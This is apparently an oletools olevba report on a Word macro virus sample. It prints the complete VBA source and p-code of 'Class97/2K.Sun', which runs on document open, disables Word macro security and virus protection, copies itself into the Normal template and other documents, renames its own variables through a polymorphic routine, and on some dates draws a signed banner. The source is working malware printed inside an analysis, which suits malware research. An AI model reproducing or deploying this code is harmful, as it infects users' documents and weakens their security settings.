olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next: Randomize
Const Ve599148 = "9.0", Le725352 = "Macro", Jx370740 = 3, Lw258201 = 0, Au336951 = &H1, Bo669866 = 1
If Application.Version = Ve599148 Then
CommandBars(Le725352).Controls(Jx370740).Enabled = (Rnd * Lw258201)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = Au336951
Else
Options.VirusProtection = (Rnd * Lw258201)
End If
Options.SaveNormalPrompt = (Rnd * Lw258201)
Set Sf57356 = ThisDocument.VBProject.VBComponents(Bo669866).CodeModule
If MacroContainer = ActiveDocument Then Set Rm11693 = NormalTemplate.VBProject.VBComponents(Bo669866).CodeModule Else Set Rm11693 = ActiveDocument.VBProject.VBComponents(Bo669866).CodeModule: Qe468747 = (Rnd * Bo669866)
If Sf57356.countoflines <> Rm11693.countoflines Then
Rm11693.deletelines Bo669866, Rm11693.countoflines
Rm11693.insertlines Bo669866, Nw53841(Sf57356.lines(Bo669866, Sf57356.countoflines))
If Qe468747 <> Lw258201 Then ActiveDocument.SaveAs ActiveDocument.FullName
End If
If Day(Now()) = Hour(Now()) Then
ActiveDocument.Shapes.AddShape(msoShapeSun, 160.05, 99.2, 342#, 117#).Select
With Selection
.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, Lw258201)
.ShapeRange.TextFrame.TextRange.Select
.TypeText Text:="Class97/2K.Sun" & Chr(11) & "by jackie twoflower" & Chr(11) & "Lz0NT/MVT"
.ParagraphFormat.Alignment = wdAlignParagraphCenter
End With
End If
End Sub
Private Function Nw53841(Vg813412) As String ' PVP v1.1
Const Lw258201 = 0, Bo669866 = 1, Gv23294 = 21, Dj66244 = 22, Ss45375 = 65, Ok831795 = 122, Gt820969 = 999
Dim Le946218(Bo669866 To Gv23294)
Le946218(1) = "Ve599148": Le946218(2) = "Le725352": Le946218(3) = "Jx370740": Le946218(4) = "Lw258201": Le946218(5) = "Au336951": Le946218(6) = "Bo669866": Le946218(7) = "Sf57356": Le946218(8) = "Rm11693"
Le946218(9) = "Gv23294": Le946218(10) = "Dj66244": Le946218(11) = "Ss45375": Le946218(12) = "Ok831795": Le946218(13) = "Gt820969": Le946218(14) = "Nw53841": Le946218(15) = "Le946218": Le946218(16) = "Kw691591"
Le946218(17) = "Rv887223": Le946218(18) = "Km438468": Le946218(19) = "Gk687354": Le946218(20) = "Vg813412": Le946218(21) = "Qe468747"
For Kw691591 = Bo669866 To Gv23294
Rv887223 = Chr(Ss45375 + Int(Rnd * Dj66244)) & Chr(Ok831795 - Int(Rnd * Dj66244)) & Int(Rnd * Gt820969) & Int(Rnd * Gt820969)
Km438468 = Bo669866
Gk687354: Km438468 = InStr(Km438468 + Bo669866, Vg813412, Le946218(Kw691591))
If Km438468 <> Lw258201 Then Vg813412 = Mid(Vg813412, Bo669866, (Km438468 - Bo669866)) & Rv887223 & Mid(Vg813412, (Km438468 + Len(Le946218(Kw691591))), Len(Vg813412)): GoTo Gk687354
Next
Nw53841 = Vg813412
End Function
' Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT
' Freedom will only be available through revolution or death...

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.z
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5488 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x0003 "9.0"
' 	VarDefn Ve599148
' 	LitStr 0x0005 "Macro"
' 	VarDefn Le725352
' 	LitDI2 0x0003 
' 	VarDefn Jx370740
' 	LitDI2 0x0000 
' 	VarDefn Lw258201
' 	LitHI2 0x0001 
' 	VarDefn Au336951
' 	LitDI2 0x0001 
' 	VarDefn Bo669866
' Line #3:
' 	Ld Application 
' 	MemLd Version 
' 	Ld Ve599148 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	Ld Rnd 
' 	Ld Lw258201 
' 	Mul 
' 	Paren 
' 	Ld Jx370740 
' 	Ld Le725352 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	Ld Au336951 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	Ld Rnd 
' 	Ld Lw258201 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Ld Rnd 
' 	Ld Lw258201 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	SetStmt 
' 	Ld Bo669866 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Sf57356 
' Line #11:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Bo669866 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Rm11693 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Bo669866 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Rm11693 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld Bo669866 
' 	Mul 
' 	Paren 
' 	St Qe468747 
' 	EndIf 
' Line #12:
' 	Ld Sf57356 
' 	MemLd countoflines 
' 	Ld Rm11693 
' 	MemLd countoflines 
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld Bo669866 
' 	Ld Rm11693 
' 	MemLd countoflines 
' 	Ld Rm11693 
' 	ArgsMemCall deletelines 0x0002 
' Line #14:
' 	Ld Bo669866 
' 	Ld Bo669866 
' 	Ld Sf57356 
' 	MemLd countoflines 
' 	Ld Sf57356 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Nw53841 0x0001 
' 	Ld Rm11693 
' 	ArgsMemCall insertlines 0x0002 
' Line #15:
' 	Ld Qe468747 
' 	Ld Lw258201 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	Ld msoShapeSun 
' 	LitR8 0x999A 0x9999 0x0199 0x4064 
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x4058 
' 	LitR8 0x0000 0x0000 0x6000 0x4075 
' 	LitR8 0x0000 0x0000 0x4000 0x405D 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #19:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #20:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	Ld Lw258201 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #21:
' 	MemLdWith ShapeRange 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #22:
' 	LitStr 0x000E "Class97/2K.Sun"
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "by jackie twoflower"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "Lz0NT/MVT"
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #23:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #24:
' 	EndWith 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Function Nw53841(Vg813412, id_FFFE As String) As String)
' 	QuoteRem 0x002D 0x0009 " PVP v1.1"
' Line #28:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn Lw258201
' 	LitDI2 0x0001 
' 	VarDefn Bo669866
' 	LitDI2 0x0015 
' 	VarDefn Gv23294
' 	LitDI2 0x0016 
' 	VarDefn Dj66244
' 	LitDI2 0x0041 
' 	VarDefn Ss45375
' 	LitDI2 0x007A 
' 	VarDefn Ok831795
' 	LitDI2 0x03E7 
' 	VarDefn Gt820969
' Line #29:
' 	Dim 
' 	Ld Bo669866 
' 	Ld Gv23294 
' 	VarDefn Le946218
' Line #30:
' 	LitStr 0x0008 "Ve599148"
' 	LitDI2 0x0001 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Le725352"
' 	LitDI2 0x0002 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Jx370740"
' 	LitDI2 0x0003 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Lw258201"
' 	LitDI2 0x0004 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Au336951"
' 	LitDI2 0x0005 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Bo669866"
' 	LitDI2 0x0006 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Sf57356"
' 	LitDI2 0x0007 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Rm11693"
' 	LitDI2 0x0008 
' 	ArgsSt Le946218 0x0001 
' Line #31:
' 	LitStr 0x0007 "Gv23294"
' 	LitDI2 0x0009 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Dj66244"
' 	LitDI2 0x000A 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Ss45375"
' 	LitDI2 0x000B 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Ok831795"
' 	LitDI2 0x000C 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Gt820969"
' 	LitDI2 0x000D 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Nw53841"
' 	LitDI2 0x000E 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Le946218"
' 	LitDI2 0x000F 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Kw691591"
' 	LitDI2 0x0010 
' 	ArgsSt Le946218 0x0001 
' Line #32:
' 	LitStr 0x0008 "Rv887223"
' 	LitDI2 0x0011 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Km438468"
' 	LitDI2 0x0012 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Gk687354"
' 	LitDI2 0x0013 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Vg813412"
' 	LitDI2 0x0014 
' 	ArgsSt Le946218 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Qe468747"
' 	LitDI2 0x0015 
' 	ArgsSt Le946218 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld Kw691591 
' 	EndForVariable 
' 	Ld Bo669866 
' 	Ld Gv23294 
' 	For 
' Line #34:
' 	Ld Ss45375 
' 	Ld Rnd 
' 	Ld Dj66244 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Ok831795 
' 	Ld Rnd 
' 	Ld Dj66244 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	Ld Gt820969 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	Ld Gt820969 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Rv887223 
' Line #35:
' 	Ld Bo669866 
' 	St Km438468 
' Line #36:
' 	Label Gk687354 
' 	Ld Km438468 
' 	Ld Bo669866 
' 	Add 
' 	Ld Vg813412 
' 	Ld Kw691591 
' 	ArgsLd Le946218 0x0001 
' 	FnInStr3 
' 	St Km438468 
' Line #37:
' 	Ld Km438468 
' 	Ld Lw258201 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Vg813412 
' 	Ld Bo669866 
' 	Ld Km438468 
' 	Ld Bo669866 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Rv887223 
' 	Concat 
' 	Ld Vg813412 
' 	Ld Km438468 
' 	Ld Kw691591 
' 	ArgsLd Le946218 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld Vg813412 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Vg813412 
' 	BoS 0x0000 
' 	GoTo Gk687354 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	Ld Vg813412 
' 	St Nw53841 
' Line #40:
' 	EndFunc 
' Line #41:
' 	QuoteRem 0x0000 0x0041 " Class97/2K.Sun & PVP v1.1 written by jackie twoflower /Lz0NT/MVT"
' Line #42:
' 	QuoteRem 0x0000 0x003E " Freedom will only be available through revolution or death..."
' Line #43:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

